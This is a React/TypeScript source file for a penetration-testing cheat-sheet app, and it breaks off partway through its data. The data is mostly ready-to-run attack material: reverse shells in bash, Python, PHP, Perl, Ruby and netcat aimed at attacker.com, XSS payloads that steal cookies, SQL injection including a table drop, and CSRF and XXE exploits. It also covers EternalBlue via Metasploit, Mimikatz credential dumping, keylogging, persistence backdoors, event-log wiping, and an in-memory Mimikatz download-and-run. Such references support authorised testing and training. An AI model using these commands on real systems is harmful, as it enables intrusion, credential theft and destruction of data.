import React, {
  useState,
  useCallback,
  useRef,
  useEffect,
  memo,
} from "react";

/* ─────────────────────────────────────────────────────────
   TYPES
───────────────────────────────────────────────────────── */
interface Command { cmd: string; desc: string; cat?: string; }
interface Payload { p: string; d: string; ctx?: string; }
interface ReverseShell { name: string; cmd: string; d: string; }
interface XSSType { type: string; payloads: Payload[]; }
interface CSRFExploit { name: string; code: string; d: string; }
interface DeserializationExample { lang: string; p: string; d: string; }
interface Tool { name: string; desc?: string; note?: string; commands: Command[]; }
interface Vulnerability {
  name: string; sev: string; desc?: string;
  payloads?: Payload[]; types?: XSSType[]; shells?: ReverseShell[];
  exploits?: CSRFExploit[]; examples?: DeserializationExample[]; tools?: Tool[];
}
interface OWASPVulnerability {
  rank: number; name: string; sev: string; desc: string;
  examples?: string[]; types?: string[]; methods?: string[];
  payloads?: Payload[]; tools?: string[]; covered?: string;
}
interface Subsection { title: string; tools?: Tool[]; vulnerabilities?: Vulnerability[]; }
interface Port { port: number; svc: string; vulns: string[]; }
interface Sheet {
  id: string; icon: string; name: string; desc: string; tags: string[];
  subsections?: Subsection[]; vulns?: Vulnerability[];
  owasp?: OWASPVulnerability[]; ports?: Port[];
}
interface SevInfo { bg: string; border: string; color: string; }
interface Particle { x: number; y: number; vx: number; vy: number; r: number; color: string; opacity: number; }

/* ─────────────────────────────────────────────────────────
   DATA
───────────────────────────────────────────────────────── */
const SHEETS: Sheet[] = [
  {
    id: "recon", icon: "🔍", name: "Reconnaissance",
    desc: "Passive & active information gathering without triggering alarms",
    tags: ["passive", "OSINT", "DNS", "subdomain"],
    subsections: [
      {
        title: "Passive Reconnaissance",
        tools: [
          {
            name: "Google Dorking", desc: "Advanced search operators for sensitive information",
            commands: [
              { cmd: "site:target.com filetype:pdf", desc: "Find PDF files on the target domain", cat: "search" },
              { cmd: "site:target.com inurl:admin", desc: "Locate admin panels exposed via URL", cat: "search" },
              { cmd: 'site:target.com intitle:"index of"', desc: "Detect open directory listings", cat: "search" },
              { cmd: "site:target.com ext:sql | ext:db | ext:dbf", desc: "Find exposed database files", cat: "search" },
              { cmd: 'site:target.com intext:"password" | intext:"username"', desc: "Find pages leaking credential hints", cat: "search" },
            ],
          },
          {
            name: "WHOIS / DNS Recon", desc: "Domain registration & DNS enumeration",
            commands: [
              { cmd: "whois target.com", desc: "Get full domain registration details", cat: "recon" },
              { cmd: "whois -h whois.arin.net 192.168.1.1", desc: "Perform ARIN IP WHOIS lookup", cat: "recon" },
              { cmd: "dnsrecon -d target.com", desc: "Run standard DNS enumeration", cat: "recon" },
              { cmd: "dnsrecon -d target.com -t axfr", desc: "Attempt a DNS zone transfer", cat: "recon" },
              { cmd: "dnsrecon -d target.com -t brt -D /usr/share/wordlists/subdomains.txt", desc: "Brute-force subdomains with a wordlist", cat: "recon" },
              { cmd: "sublist3r -d target.com -b", desc: "Enable subbrute for brute-forcing", cat: "recon" },
            ],
          },
          {
            name: "theHarvester / Shodan", desc: "Email harvesting and device search engine",
            commands: [
              { cmd: "theHarvester -d target.com -b google", desc: "Harvest emails via Google search", cat: "recon" },
              { cmd: "theHarvester -d target.com -b all", desc: "Use all available data sources", cat: "recon" },
              { cmd: "theHarvester -d target.com -b linkedin -l 500", desc: "Harvest LinkedIn with 500-result limit", cat: "recon" },
              { cmd: 'shodan search "apache" country:US', desc: "Find Apache servers in the US", cat: "recon" },
              { cmd: "shodan host 192.168.1.1", desc: "Retrieve detailed info for a specific IP", cat: "recon" },
              { cmd: 'shodan search "default password" port:22', desc: "Find SSH servers with default creds", cat: "recon" },
            ],
          },
        ],
      },
      {
        title: "Active Reconnaissance",
        tools: [
          {
            name: "Nmap", desc: "Network discovery, port scanning, version and OS detection",
            commands: [
              { cmd: "nmap -sn 192.168.1.0/24", desc: "Ping sweep to discover live hosts", cat: "scan" },
              { cmd: "nmap -sS -sV -O target.com", desc: "SYN scan with service version and OS detection", cat: "scan" },
              { cmd: "nmap -p- target.com", desc: "Scan all 65,535 TCP ports", cat: "scan" },
              { cmd: "nmap -sC -sV -p 1-1000 target.com", desc: "Default scripts + version detection on first 1000 ports", cat: "scan" },
              { cmd: "nmap -sU -p 161 target.com", desc: "UDP scan targeting the SNMP port", cat: "scan" },
              { cmd: "nmap --script vuln target.com", desc: "Run built-in vulnerability detection scripts", cat: "scan" },
              { cmd: "nmap -sV --script=http-enum target.com", desc: "Enumerate web directories and files via HTTP", cat: "scan" },
              { cmd: "nmap -A -T4 target.com", desc: "Aggressive scan: OS, version, scripts, traceroute", cat: "scan" },
              { cmd: "nmap --script=ssl-enum-ciphers -p 443 target.com", desc: "List supported SSL/TLS ciphers on port 443", cat: "scan" },
            ],
          },
          {
            name: "Masscan / Netcat", desc: "Ultra-fast port scanner and raw TCP/UDP tool",
            commands: [
              { cmd: "masscan -p1-65535 192.168.1.0/24 --rate=1000", desc: "Scan all ports on a subnet at 1000 pkts/sec", cat: "scan" },
              { cmd: "masscan -p80,443 0.0.0.0/0 --rate=10000", desc: "Find web servers across the entire internet", cat: "scan" },
              { cmd: "nc -zv target.com 1-1000", desc: "Scan ports 1–1000 with verbose output", cat: "scan" },
              { cmd: "nc -lvp 4444", desc: "Open a listening port on 4444", cat: "exploit" },
              { cmd: "nc target.com 80", desc: "Connect directly to the HTTP service", cat: "scan" },
              { cmd: "nc -e /bin/bash target.com 4444", desc: "Send a reverse shell to the attacker's listener", cat: "exploit" },
            ],
          },
        ],
      },
    ],
  },
  {
    id: "enum", icon: "📡", name: "Scanning & Enumeration",
    desc: "Identify services, software versions, and initial vulnerability surface",
    tags: ["nmap", "nikto", "smb", "snmp", "wordpress"],
    subsections: [
      {
        title: "Vulnerability Scanning",
        tools: [
          {
            name: "Nikto", desc: "Web server scanner for misconfigurations, outdated software, and dangerous files",
            commands: [
              { cmd: "nikto -h http://target.com", desc: "Basic web server scan for common issues", cat: "scan" },
              { cmd: "nikto -h http://target.com -p 80,443,8080", desc: "Scan the target on multiple ports", cat: "scan" },
              { cmd: "nikto -h http://target.com -Tuning 123bde", desc: "Custom tuning to skip certain test categories", cat: "scan" },
              { cmd: "nikto -h http://target.com -o report.html -Format html", desc: "Save full scan results as an HTML report", cat: "scan" },
              { cmd: "nikto -h http://target.com -useproxy http://proxy:8080", desc: "Route the scan through an HTTP proxy", cat: "scan" },
            ],
          },
          {
            name: "OpenVAS / Nessus", desc: "Comprehensive open-source & enterprise vulnerability scanners",
            commands: [
              { cmd: "openvas-setup", desc: "Run initial OpenVAS setup and feed sync", cat: "setup" },
              { cmd: "openvas-start", desc: "Start all OpenVAS background services", cat: "scan" },
              { cmd: "openvas-feed-update", desc: "Refresh NVT and SCAP vulnerability feeds", cat: "maint" },
              { cmd: "/opt/nessus/sbin/nessuscli scan new", desc: "Create a new scan from the CLI", cat: "scan" },
              { cmd: "/opt/nessus/sbin/nessuscli update --all", desc: "Update all Nessus vulnerability plugins", cat: "maint" },
            ],
          },
        ],
      },
      {
        title: "Service Enumeration",
        tools: [
          {
            name: "Enum4linux / SMBClient", desc: "Enumerate users, shares, and groups from Windows/Samba hosts",
            commands: [
              { cmd: "enum4linux -a target.com", desc: "Run all basic enumeration checks at once", cat: "enum" },
              { cmd: "enum4linux -U target.com", desc: "List local user accounts", cat: "enum" },
              { cmd: "enum4linux -S target.com", desc: "List available SMB shares", cat: "enum" },
              { cmd: "smbclient -L //target.com -N", desc: "List all available shares without a password", cat: "enum" },
              { cmd: "smbclient //target.com/share -U username", desc: "Connect to a named share with credentials", cat: "enum" },
              { cmd: "smbclient //target.com/C$ -U administrator", desc: "Access the default administrative C$ share", cat: "enum" },
              { cmd: "snmpwalk -c public -v2c target.com", desc: "Walk MIB using the faster SNMPv2c", cat: "enum" },
            ],
          },
          {
            name: "Gobuster / WPScan", desc: "Directory brute-forcing & WordPress vulnerability scanning",
            commands: [
              { cmd: "gobuster dir -u http://target.com -w /usr/share/wordlists/dirb/common.txt", desc: "Brute-force common web directories", cat: "enum" },
              { cmd: "gobuster dir -u http://target.com -w wordlist.txt -x php,html,txt", desc: "Brute-force directories and common file extensions", cat: "enum" },
              { cmd: "gobuster dns -d target.com -w subdomains.txt", desc: "Enumerate subdomains via DNS brute-force", cat: "enum" },
              { cmd: "gobuster vhost -u http://target.com -w vhosts.txt", desc: "Brute-force virtual host names", cat: "enum" },
              { cmd: "wpscan --url http://target.com", desc: "Run a basic WordPress security scan", cat: "enum" },
              { cmd: "wpscan --url http://target.com --enumerate u", desc: "Enumerate all WordPress user accounts", cat: "enum" },
              { cmd: "wpscan --url http://target.com --enumerate vp", desc: "Find plugins with known vulnerabilities", cat: "enum" },
              { cmd: "wpscan --url http://target.com -U users.txt -P passwords.txt", desc: "Brute-force WordPress login with user/pass lists", cat: "exploit" },
            ],
          },
        ],
      },
    ],
  },
  {
    id: "sqli", icon: "💉", name: "SQL Injection",
    desc: "Inject malicious SQL to extract data, bypass auth, or execute OS commands",
    tags: ["critical", "database", "auth-bypass", "blind"],
    vulns: [
      {
        name: "SQL Injection", sev: "critical",
        desc: "Unsanitised user input passed directly into SQL queries",
        tools: [
          {
            name: "SQLmap", desc: "Automated SQL injection detection and exploitation",
            commands: [
              { cmd: 'sqlmap -u "http://target.com/page.php?id=1"', desc: "Basic injection test against a URL parameter", cat: "exploit" },
              { cmd: 'sqlmap -u "http://target.com/page.php?id=1" --dbs', desc: "List all accessible databases after injection", cat: "exploit" },
              { cmd: 'sqlmap -u "http://target.com/page.php?id=1" -D database --tables', desc: "List all tables inside a specific database", cat: "exploit" },
              { cmd: 'sqlmap -u "http://target.com/page.php?id=1" -D database -T users -C username,password --dump', desc: "Extract usernames and passwords from the table", cat: "exploit" },
              { cmd: 'sqlmap -u "http://target.com/page.php?id=1" --os-shell', desc: "Attempt to spawn an interactive OS shell", cat: "exploit" },
              { cmd: "sqlmap -r request.txt --batch", desc: "Run injection test from a saved Burp request file", cat: "exploit" },
              { cmd: 'sqlmap -u "http://target.com/page.php?id=1" --level=5 --risk=3', desc: "Most aggressive testing mode with full payloads", cat: "exploit" },
            ],
          },
        ],
        payloads: [
          { p: "' OR '1'='1", d: "Authentication bypass — always evaluates true", ctx: "Login forms" },
          { p: "' UNION SELECT NULL,NULL,NULL--", d: "Determine column count for UNION injection", ctx: "UNION-based" },
          { p: "' UNION SELECT username,password FROM users--", d: "Extract credentials from the users table", ctx: "UNION-based" },
          { p: "admin'--", d: "Comment out the password check in the query", ctx: "Auth bypass" },
          { p: "1' AND 1=1--", d: "Boolean-based blind test — returns true", ctx: "Blind SQLi" },
          { p: "1' AND 1=2--", d: "Boolean-based blind test — returns false", ctx: "Blind SQLi" },
          { p: "'; DROP TABLE users--", d: "Destructive query — deletes the users table", ctx: "DB manipulation" },
          { p: "' OR SLEEP(5)--", d: "Time-based blind test — delays 5 seconds if vulnerable", ctx: "Blind SQLi" },
        ],
      },
    ],
  },
  {
    id: "xss", icon: "📜", name: "XSS & Injection",
    desc: "Cross-site scripting, command injection, and reverse shells",
    tags: ["high", "critical", "javascript", "reverse-shell"],
    vulns: [
      {
        name: "Cross-Site Scripting (XSS)", sev: "high",
        desc: "Inject scripts into pages viewed by other users",
        types: [
          { type: "Reflected XSS", payloads: [
            { p: "<script>alert('XSS')</script>", d: "Classic XSS proof-of-concept alert", ctx: "URL params, search fields" },
            { p: "<img src=x onerror=alert('XSS')>", d: "Trigger XSS via a broken image event", ctx: "Input fields" },
            { p: "<svg/onload=alert('XSS')>", d: "SVG onload event fires without user interaction", ctx: "Input fields" },
            { p: "javascript:alert('XSS')", d: "Inline JavaScript in a link href attribute", ctx: "href attributes" },
          ]},
          { type: "Stored XSS", payloads: [
            { p: "<script>document.location='http://attacker.com/steal.php?cookie='+document.cookie</script>", d: "Exfiltrate session cookies to attacker server", ctx: "Comments, profile fields" },
            { p: "<script src=http://attacker.com/malicious.js></script>", d: "Load and execute a remote malicious script", ctx: "Persistent storage fields" },
          ]},
          { type: "DOM-based XSS", payloads: [
            { p: "#<img src=x onerror=alert('XSS')>", d: "Inject into DOM via URL fragment", ctx: "Hash/fragment manipulation" },
          ]},
        ],
      },
      {
        name: "Command Injection", sev: "critical",
        desc: "Execute arbitrary OS commands through unsanitised input",
        payloads: [
          { p: "; ls -la", d: "Append a second command to list directory contents", ctx: "Command chaining" },
          { p: "| whoami", d: "Pipe to whoami to reveal the running user", ctx: "Pipe operator" },
          { p: "&& cat /etc/passwd", d: "Read the passwd file if the first command succeeds", ctx: "AND operator" },
          { p: "; nc -e /bin/bash attacker.com 4444", d: "Send a reverse shell via Netcat", ctx: "Reverse shell" },
          { p: "`whoami`", d: "Command substitution using backticks", ctx: "Backtick substitution" },
          { p: "$(id)", d: "Command substitution using dollar-paren syntax", ctx: "Dollar-paren substitution" },
          { p: "; ping -c 10 attacker.com", d: "Detect blind injection by observing outbound ping", ctx: "Blind injection" },
        ],
        shells: [
          { name: "Bash", cmd: "bash -i >& /dev/tcp/attacker.com/4444 0>&1", d: "Bash TCP reverse shell over /dev/tcp" },
          { name: "Python", cmd: `python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("attacker.com",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'`, d: "Python socket reverse shell" },
          { name: "PHP", cmd: `php -r '$sock=fsockopen("attacker.com",4444);exec("/bin/sh -i <&3 >&3 2>&3");'`, d: "PHP fsockopen reverse shell" },
          { name: "Netcat", cmd: "nc -e /bin/sh attacker.com 4444", d: "Netcat reverse shell with -e flag" },
          { name: "Perl", cmd: `perl -e 'use Socket;$i="attacker.com";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");}'`, d: "Perl socket reverse shell" },
          { name: "Ruby", cmd: `ruby -rsocket -e'f=TCPSocket.open("attacker.com",4444).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'`, d: "Ruby TCPSocket reverse shell" },
        ],
      },
    ],
  },
  {
    id: "webattacks", icon: "🌐", name: "Web Attacks",
    desc: "LFI, RFI, XXE, SSRF, CSRF, and insecure deserialization",
    tags: ["high", "critical", "file-inclusion", "xxe", "ssrf", "csrf"],
    vulns: [
      {
        name: "Local File Inclusion (LFI)", sev: "high",
        desc: "Include local server files through unsanitised path parameters",
        payloads: [
          { p: "../../../../etc/passwd", d: "Read the Unix password file via path traversal", ctx: "Path traversal" },
          { p: "../../../../etc/shadow", d: "Read password hashes (requires elevated privileges)", ctx: "Path traversal" },
          { p: "..\\..\\..\\..\\windows\\system32\\config\\sam", d: "Read the Windows SAM credential store", ctx: "Windows traversal" },
          { p: "php://filter/convert.base64-encode/resource=index.php", d: "Retrieve PHP source code as base64", ctx: "PHP wrapper" },
          { p: "php://input", d: "Execute PHP code supplied in the POST body", ctx: "PHP wrapper" },
          { p: "data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7Pz4=", d: "Execute a PHP webshell via data URI", ctx: "Data wrapper" },
          { p: "/proc/self/environ", d: "Read the process environment for log poisoning", ctx: "Linux proc" },
          { p: "/var/log/apache2/access.log", d: "Access the Apache log for log poisoning attacks", ctx: "Log poisoning" },
        ],
      },
      {
        name: "XML External Entity (XXE)", sev: "high",
        desc: "Abuse XML parsers to read files or pivot to internal services",
        payloads: [
          { p: '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>', d: "Read a local file via an external entity reference", ctx: "File disclosure" },
          { p: '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://internal-server/admin">]><foo>&xxe;</foo>', d: "Use XXE to probe internal HTTP services (SSRF)", ctx: "Internal network scan" },
          { p: '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://attacker.com/evil.dtd">%xxe;]>', d: "Blind XXE via parameter entity loading remote DTD", ctx: "Out-of-band XXE" },
        ],
      },
      {
        name: "SSRF — Server-Side Request Forgery", sev: "high",
        desc: "Force the server to make requests to internal or external resources",
        payloads: [
          { p: "http://localhost:80", d: "Access services bound only to the loopback interface", ctx: "Internal service" },
          { p: "http://127.0.0.1:8080", d: "Probe an internal app on a non-standard port", ctx: "Internal port scan" },
          { p: "http://169.254.169.254/latest/meta-data/", d: "Retrieve AWS EC2 instance metadata credentials", ctx: "Cloud metadata" },
          { p: "http://192.168.0.1", d: "Scan private RFC 1918 address space", ctx: "Internal network" },
          { p: "file:///etc/passwd", d: "Read local files via the file protocol", ctx: "File protocol" },
          { p: "gopher://127.0.0.1:25/_MAIL%20FROM:attacker@evil.com", d: "Use Gopher to interact with internal SMTP", ctx: "Protocol smuggling" },
        ],
      },
      {
        name: "CSRF — Cross-Site Request Forgery", sev: "medium",
        desc: "Trick authenticated users into performing unintended actions",
        exploits: [
          { name: "HTML Form CSRF", code: `<html><body>\n  <form action="http://target.com/change-password" method="POST">\n    <input type="hidden" name="password" value="hacked123" />\n    <input type="hidden" name="confirm_password" value="hacked123" />\n  </form>\n  <script>document.forms[0].submit();</script>\n</body></html>`, d: "Auto-submitting hidden form triggers password change" },
          { name: "Image Tag CSRF", code: '<img src="http://target.com/delete-account?confirm=yes" />', d: "GET request embedded in an image src attribute" },
          { name: "XHR CSRF", code: `<script>\nvar xhr = new XMLHttpRequest();\nxhr.open("POST","http://target.com/transfer-money",true);\nxhr.setRequestHeader("Content-Type","application/x-www-form-urlencoded");\nxhr.send("amount=1000&to=attacker");\n</script>`, d: "AJAX POST request forged from an attacker-controlled page" },
        ],
      },
      {
        name: "Insecure Deserialization", sev: "critical",
        desc: "Deserialising untrusted data allows object injection and RCE",
        tools: [{ name: "ysoserial", desc: "Generate Java deserialization gadget chain payloads", commands: [
          { cmd: 'java -jar ysoserial.jar CommonsCollections5 "calc.exe" | base64', desc: "Generate a Java gadget chain that spawns calc.exe", cat: "exploit" },
          { cmd: 'java -jar ysoserial.jar CommonsCollections6 "nc -e /bin/bash attacker.com 4444"', desc: "Generate a reverse shell gadget chain payload", cat: "exploit" },
        ]}],
        examples: [
          { lang: "PHP", p: 'O:8:"UserData":2:{s:8:"username";s:5:"admin";s:7:"isAdmin";b:1;}', d: "Manipulate a serialised PHP object to elevate privileges" },
          { lang: "Python (pickle)", p: "cos\\nsystem\\n(S'id'\\ntR.", d: "Python pickle payload that executes the id command" },
        ],
      },
    ],
  },
  {
    id: "netexploit", icon: "⚡", name: "Network Exploitation",
    desc: "Metasploit, NTLM relay, protocol attacks, and credential theft",
    tags: ["metasploit", "smb", "eternalblue", "responder", "impacket"],
    subsections: [{
      title: "Network Exploitation Tools",
      tools: [
        { name: "Metasploit Framework", desc: "Full-featured penetration testing and exploit development platform", commands: [
          { cmd: "msfconsole", desc: "Launch the interactive Metasploit console", cat: "framework" },
          { cmd: "search ms17-010", desc: "Search the module database for EternalBlue exploits", cat: "framework" },
          { cmd: "use exploit/windows/smb/ms17_010_eternalblue", desc: "Load the EternalBlue SMB exploit module", cat: "exploit" },
          { cmd: "set RHOSTS 192.168.1.100", desc: "Set the target IP address for the exploit", cat: "config" },
          { cmd: "set PAYLOAD windows/x64/meterpreter/reverse_tcp", desc: "Configure a 64-bit Meterpreter reverse TCP payload", cat: "config" },
          { cmd: "set LHOST 192.168.1.50 && set LPORT 4444", desc: "Set attacker IP and listener port", cat: "config" },
          { cmd: "exploit", desc: "Execute the configured exploit against the target", cat: "exploit" },
          { cmd: "sessions -l", desc: "List all currently active sessions", cat: "post" },
          { cmd: "sessions -i 1", desc: "Drop into an interactive session by session ID", cat: "post" },
          { cmd: "use auxiliary/scanner/smb/smb_version", desc: "Detect SMB version to identify vulnerable systems", cat: "recon" },
          { cmd: "use auxiliary/scanner/ssh/ssh_login", desc: "Brute-force SSH logins with a credential list", cat: "exploit" },
        ]},
        { name: "Responder", desc: "Poison LLMNR/NBT-NS/MDNS to capture NTLMv2 challenge hashes", commands: [
          { cmd: "responder -I eth0 -rdwv", desc: "Start full Responder poisoning on the eth0 interface", cat: "exploit" },
          { cmd: "responder -I eth0 -rdwv -F", desc: "Force WPAD proxy authentication to capture credentials", cat: "exploit" },
        ]},
        { name: "Impacket", desc: "Python library implementing network protocols for attack simulations", commands: [
          { cmd: "python3 psexec.py domain/user:password@target.com", desc: "Execute commands remotely using SMB (like PsExec)", cat: "exploit" },
          { cmd: "python3 secretsdump.py domain/user:password@target.com", desc: "Dump SAM, LSA secrets, and NTDS hashes remotely", cat: "exploit" },
          { cmd: "python3 smbexec.py domain/user:password@target.com", desc: "Execute commands over SMB without dropping files", cat: "exploit" },
          { cmd: "python3 wmiexec.py domain/user:password@target.com", desc: "Execute commands over WMI (leaves fewer logs)", cat: "exploit" },
          { cmd: "python3 ntlmrelayx.py -tf targets.txt -smb2support", desc: "Relay captured NTLM hashes to authenticate to other hosts", cat: "exploit" },
        ]},
      ],
    }],
  },
  {
    id: "passwords", icon: "🔐", name: "Password Cracking",
    desc: "Dictionary attacks, brute force, rules-based cracking, and online login attacks",
    tags: ["hashcat", "john", "hydra", "ntlm", "wordlist"],
    subsections: [{
      title: "Password Cracking Tools",
      tools: [
        { name: "Hashcat", desc: "GPU-accelerated password recovery with extensive mode support", commands: [
          { cmd: "hashcat -m 0 -a 0 hashes.txt /usr/share/wordlists/rockyou.txt", desc: "MD5 dictionary attack using rockyou", cat: "crack" },
          { cmd: "hashcat -m 1000 -a 0 hashes.txt wordlist.txt", desc: "NTLM dictionary attack", cat: "crack" },
          { cmd: "hashcat -m 1800 -a 0 hashes.txt wordlist.txt", desc: "Linux SHA-512 ($6$) dictionary attack", cat: "crack" },
          { cmd: "hashcat -m 0 -a 3 hash.txt ?l?l?l?l?l?l", desc: "Brute-force MD5 with exactly six lowercase letters", cat: "crack" },
          { cmd: "hashcat -m 0 -a 3 hash.txt ?u?l?l?l?l?d?d?d", desc: "Brute-force mixed uppercase, lowercase, and digits", cat: "crack" },
          { cmd: "hashcat -m 1000 -a 0 hashes.txt wordlist.txt -r rules/best64.rule", desc: "Dictionary attack enhanced with transformation rules", cat: "crack" },
          { cmd: "hashcat --show hashes.txt", desc: "Print all cracked hashes with their plaintext", cat: "crack" },
        ]},
        { name: "John the Ripper", desc: "Versatile offline password cracker supporting hundreds of hash formats", commands: [
          { cmd: "john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt", desc: "Dictionary attack using the rockyou wordlist", cat: "crack" },
          { cmd: "john --format=NT hashes.txt", desc: "Crack Windows NTLM hashes specifically", cat: "crack" },
          { cmd: "john --show hashes.txt", desc: "Display all previously cracked passwords", cat: "crack" },
          { cmd: "john --incremental hashes.txt", desc: "Pure brute-force mode across all character sets", cat: "crack" },
          { cmd: "unshadow passwd shadow > combined.txt", desc: "Merge /etc/passwd and /etc/shadow for John", cat: "prep" },
          { cmd: "john combined.txt", desc: "Crack the merged passwd/shadow file", cat: "crack" },
        ]},
        { name: "Hydra", desc: "Fast network login cracker supporting 50+ protocols", commands: [
          { cmd: "hydra -l admin -P passwords.txt ssh://target.com", desc: "Brute-force SSH with a fixed username", cat: "online" },
          { cmd: "hydra -L users.txt -P passwords.txt ftp://target.com", desc: "Brute-force FTP with user and password lists", cat: "online" },
          { cmd: 'hydra -l admin -P passwords.txt target.com http-post-form "/login:username=^USER^&password=^PASS^:F=incorrect"', desc: "Brute-force an HTTP POST login form", cat: "online" },
          { cmd: "hydra -L users.txt -P passwords.txt smb://target.com", desc: "Brute-force Windows SMB authentication", cat: "online" },
          { cmd: "hydra -l admin -P passwords.txt rdp://target.com", desc: "Brute-force Remote Desktop Protocol", cat: "online" },
          { cmd: "hydra -L users.txt -P passwords.txt mysql://target.com", desc: "Brute-force MySQL database logins", cat: "online" },
          { cmd: "hydra -t 4 -l admin -P passwords.txt ssh://target.com", desc: "Limit to 4 parallel threads to avoid lockouts", cat: "online" },
        ]},
      ],
    }],
  },
  {
    id: "wireless", icon: "📶", name: "Wireless Attacks",
    desc: "WPA/WPA2 handshake capture, WPS brute force, and ARP spoofing",
    tags: ["aircrack", "wpa2", "wps", "mitm", "arp"],
    subsections: [{
      title: "Wireless Exploitation",
      tools: [
        { name: "Aircrack-ng Suite", desc: "Complete toolkit for wireless network auditing and WPA cracking", commands: [
          { cmd: "airmon-ng start wlan0", desc: "Enable monitor mode on the wlan0 adapter", cat: "wireless" },
          { cmd: "airodump-ng wlan0mon", desc: "Scan for nearby wireless access points", cat: "wireless" },
          { cmd: "airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w capture wlan0mon", desc: "Capture packets from a specific AP on channel 6", cat: "wireless" },
          { cmd: "aireplay-ng -0 10 -a AA:BB:CC:DD:EE:FF wlan0mon", desc: "Send 10 deauth frames to force a WPA handshake", cat: "wireless" },
          { cmd: "aircrack-ng -w wordlist.txt -b AA:BB:CC:DD:EE:FF capture-01.cap", desc: "Crack WPA/WPA2 PSK from captured handshake", cat: "crack" },
          { cmd: "aireplay-ng -3 -b AA:BB:CC:DD:EE:FF wlan0mon", desc: "ARP replay attack to accelerate WEP IV collection", cat: "wireless" },
          { cmd: "aircrack-ng capture-01.cap", desc: "Crack WEP encryption from the capture file", cat: "crack" },
        ]},
        { name: "Reaver / Bettercap", desc: "WPS PIN brute force and network MITM framework", commands: [
          { cmd: "reaver -i wlan0mon -b AA:BB:CC:DD:EE:FF -vv", desc: "Attack WPS PIN with verbose output", cat: "wireless" },
          { cmd: "wash -i wlan0mon", desc: "Scan for access points with WPS enabled", cat: "wireless" },
          { cmd: "bettercap -iface eth0", desc: "Launch Bettercap on the eth0 interface", cat: "mitm" },
          { cmd: "net.probe on && net.sniff on", desc: "Enable network discovery and sniffing", cat: "mitm" },
          { cmd: "set arp.spoof.targets 192.168.1.100 && arp.spoof on", desc: "ARP poison a specific target to intercept traffic", cat: "mitm" },
        ]},
      ],
    }],
  },
  {
    id: "postexploit", icon: "🕵️", name: "Post-Exploitation",
    desc: "Meterpreter, Mimikatz, Kerberos attacks, and persistence",
    tags: ["meterpreter", "mimikatz", "kerberoast", "persistence", "AD"],
    subsections: [{
      title: "Post-Exploitation Tools",
      tools: [
        { name: "Meterpreter", desc: "Advanced in-memory payload providing a rich post-exploitation API", commands: [
          { cmd: "sysinfo", desc: "Display OS, hostname, and architecture details", cat: "enum" },
          { cmd: "getuid", desc: "Show the current process owner", cat: "enum" },
          { cmd: "getsystem", desc: "Attempt automatic privilege escalation to SYSTEM", cat: "privesc" },
          { cmd: "hashdump", desc: "Extract NTLM password hashes from the SAM database", cat: "creds" },
          { cmd: "screenshot", desc: "Capture the current desktop screenshot", cat: "gather" },
          { cmd: "keyscan_start && keyscan_dump", desc: "Start keylogger then dump keystrokes", cat: "gather" },
          { cmd: "ps && migrate 1234", desc: "List processes then migrate to PID 1234", cat: "persist" },
          { cmd: "run post/windows/gather/credentials/credential_collector", desc: "Collect stored credentials from common locations", cat: "creds" },
          { cmd: "download /path/to/file /local/path", desc: "Download a file from the target to the attacker", cat: "gather" },
          { cmd: "upload /local/file /remote/path", desc: "Upload a file from the attacker to the target", cat: "persist" },
          { cmd: "shell", desc: "Drop into a native OS command shell", cat: "shell" },
          { cmd: "run persistence -X -i 60 -p 4444 -r attacker.com", desc: "Install a persistent backdoor that survives reboots", cat: "persist" },
          { cmd: "clearev", desc: "Wipe Application, System, and Security event logs", cat: "cleanup" },
        ]},
        { name: "Mimikatz", desc: "Extract plaintext passwords, hashes, and Kerberos tickets from Windows memory", note: "Requires admin/SYSTEM rights. Triggers most modern EDR solutions.", commands: [
          { cmd: "privilege::debug", desc: "Obtain SeDebugPrivilege required for LSASS access", cat: "priv" },
          { cmd: "sekurlsa::logonpasswords", desc: "Dump plaintext credentials and hashes from LSASS", cat: "creds" },
          { cmd: "lsadump::sam", desc: "Dump local SAM database password hashes", cat: "creds" },
          { cmd: "lsadump::secrets", desc: "Extract LSA secrets including service account creds", cat: "creds" },
          { cmd: "kerberos::list", desc: "List all Kerberos tickets in the current session", cat: "kerb" },
          { cmd: "kerberos::golden /user:admin /domain:domain.com /sid:S-1-5-21... /krbtgt:hash /id:500", desc: "Forge a Golden Ticket for persistent domain admin access", cat: "kerb" },
          { cmd: "lsadump::dcsync /domain:domain.local /user:Administrator", desc: "Simulate DC replication to steal the domain admin hash", cat: "creds" },
          { cmd: "sekurlsa::pth /user:admin /domain:domain /ntlm:HASH /run:cmd.exe", desc: "Pass-the-Hash: spawn cmd.exe with stolen NTLM hash", cat: "pth" },
        ]},
        { name: "Rubeus", desc: "C# Kerberos attack toolkit for roasting, ticket manipulation, and relay", commands: [
          { cmd: "Rubeus.exe kerberoast /outfile:hashes.kerberoast", desc: "Request service tickets and save hashes for offline cracking", cat: "kerb" },
          { cmd: "Rubeus.exe asreproast /format:hashcat /outfile:asprep.txt", desc: "Extract AS-REP hashes from accounts without pre-auth", cat: "kerb" },
          { cmd: "Rubeus.exe ptt /ticket:ticket.kirbi", desc: "Inject a Kerberos ticket into the current session", cat: "kerb" },
        ]},
        { name: "Empire / PowerSploit", desc: "PowerShell post-exploitation framework with Mimikatz integration", commands: [
          { cmd: "uselistener http", desc: "Create an HTTP command-and-control listener", cat: "c2" },
          { cmd: "usestager windows/launcher_bat", desc: "Generate a batch file stager for initial access", cat: "c2" },
          { cmd: "agents", desc: "List all active beaconing Empire agents", cat: "c2" },
          { cmd: `powershell -nop -exec bypass -c "IEX (New-Object Net.WebClient).DownloadString('http://attacker.com/Invoke-Mimikatz.ps1'); Invoke-Mimikatz"`, desc: "Download and execute Mimikatz entirely in memory", cat: "creds" },
